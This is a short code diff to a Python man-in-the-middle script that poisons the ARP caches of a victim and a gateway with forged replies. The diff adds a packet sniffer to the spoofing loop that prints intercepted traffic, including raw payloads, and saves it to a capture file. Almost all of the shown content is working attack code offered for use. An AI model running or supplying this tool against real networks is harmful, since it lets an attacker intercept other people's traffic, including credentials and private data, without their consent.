@@ -3,6 +3,7 @@ import sys
 import os
 import time
 
+global interface
 
 def help_text():
     print("\nUsage:\n python mitm.py network_range\n")
@@ -38,6 +39,11 @@ def trick(gm, vm):
     send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst= vm))
     send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst= gm))
 
+def sniffer():
+    global interface
+    pkts = sniff(iface = interface, count = 10, prn=lambda x:x.sprintf(" Source: %IP.src% : %Ether.src%, \n %Raw.load% \n\n Reciever: %IP.dst% \n +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n"))
+    wrpcap("temp.pcap", pkts)
+
 def mitm():
     try:
         victimMAC = get_mac(victimIP)
@@ -58,6 +64,7 @@ def mitm():
         try:
             trick(gatewayMAC, victimMAC)
             time.sleep(1.5)
+            sniffer()
         except KeyboardInterrupt:
             reARP()
             break
